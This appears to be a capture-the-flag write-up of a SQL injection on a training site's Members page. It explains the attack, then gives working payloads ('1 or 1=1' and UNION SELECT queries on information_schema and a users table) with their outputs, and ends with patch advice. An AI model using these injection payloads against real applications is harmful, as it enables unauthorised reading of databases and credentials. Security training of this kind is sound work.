# 💉 SQL Members Injection

## 📖 Definition

An **SQL Injection** breach is a type of cyberattack where an attacker exploits vulnerabilities in a web application’s database query handling by injecting malicious SQL statements into input fields. These injected queries manipulate the database to reveal, alter, or delete sensitive information without proper authorization.

**Key Characteristics of an SQL Injection:**

1. **Database Manipulation:** Attackers inject SQL commands into input fields (e.g., login forms, search bars) to manipulate the database directly, bypassing application logic.

2. **Sensitive Data Exposure:** Exploited queries may reveal critical information such as table structures, user credentials, and other confidential data stored in the database.

3. **Target of Exploitation:** SQL Injection exploits applications that fail to properly sanitize or validate user input before embedding it into SQL queries.

4. **Common Techniques:**
	- **Union-Based Injection:** Combines results from malicious queries with legitimate ones using UNION statements.
	- **Error-Based Injection:** Forces the application to display database errors that reveal useful information.
	- **Blind SQL Injection:** Exploits true/false conditions in the application to deduce database details without direct feedback.

## 🔍 Discovery

When we land on the **Members** page, we see that we can insert some SQL code. We first try to display all users by using `1 or 1=1` and it worked. The, we see this:

```Text
ID: 1 or 1 = 1 
First name: Flag
Surname : GetThe
```

We knew that we just found something so we decided to digg in. First, we try to retrieve the names of all tables in the database thanks to:

```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables--
```

We get dozen of tables but one was particularly interesting:

```Text
ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables-- 
First name: users
Surname :
```

Then, we try to display the columns of the `users` table thanks to this command:

```sql
1 UNION SELECT column_name, NULL FROM users.columns--
```

But we get:

```Text
SELECT command denied to user 'borntosec'@'localhost' for table 'columns'
```

So we more simply try to display all the columns of the database:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns--
```

And we get a better result, hundreds of results in fact but the last seventeen were the most interesting, the names of these columns are: `username`, `password`, `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`, `id_comment`, `url`, `title`, `id_vote`, `vote`, `nb_vote` and `subject`. It seems to be information about the users. So we start to display all the columns in the order, and we displayed the `Commentaire` column, we get five outputs and the fifth was interesting:

```Text
ID: 1 UNION SELECT Commentaire, NULL FROM users-- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname :
```

Then, we try to display the `countersign` column and the fifth was:

```Text
5ff9d0165b4f92b14994e5c685cdce28
```

So we had the idea to combine both columns (`Commentaire` and `countersign`) with this command:

```sql
1 UNION SELECT Commentaire, countersign FROM users--
```

Then we get:

```Text
ID: 1 UNION SELECT Commentaire, countersign FROM users-- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

After detecting the encryption thanks to the dCode cipher identifier (it was MD5), we decrypt it and get `FortyTwo`, so we lower all the characters and then we encrypt it with SHA-256 and we get our flag!

## 🏁 Flag

1. Go on the **Members** page.
2. Enter `1 UNION SELECT Commentaire, countersign FROM users--`.
3. Decrypt the code using MD5.
4. Lower all the characters.
5. Encrypt the result in SHA-256.

## 🔧 Patch

Many defensive measures can be taken, but here are the main ones:

1. **Use Parameterized Queries (Prepared Statements)**
	- Replace dynamic SQL queries with parameterized queries or prepared statements.
2. **Implement Input Validation and Sanitization**
	- Validate all user inputs to ensure they conform to expected formats (e.g., numbers, email addresses).
	- Sanitize inputs by escaping special SQL characters if direct parameterization is unavailable.
3. **Employ an ORM (Object-Relational Mapping) Framework**
	- Use ORM tools like SQLAlchemy (Python), Hibernate (Java), or Entity Framework (C#) to abstract database interactions.
	- ORMs automatically parameterize queries and reduce the likelihood of injection.
4. **Limit Database Privileges**
	- Follow the Principle of Least Privilege:
		- Assign each application user the minimum permissions necessary.
		- Avoid using highly privileged accounts (e.g., `root`) in application database connections.

## 📚 References

- [SQL Injection (OWASP)](https://owasp.org/www-community/attacks/SQL_Injection)
- [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [SQL injections (SQLi): principles, impacts, exploitations and security best practices (Vaadata)](https://www.vaadata.com/blog/sql-injections-principles-impacts-exploitations-security-best-practices/)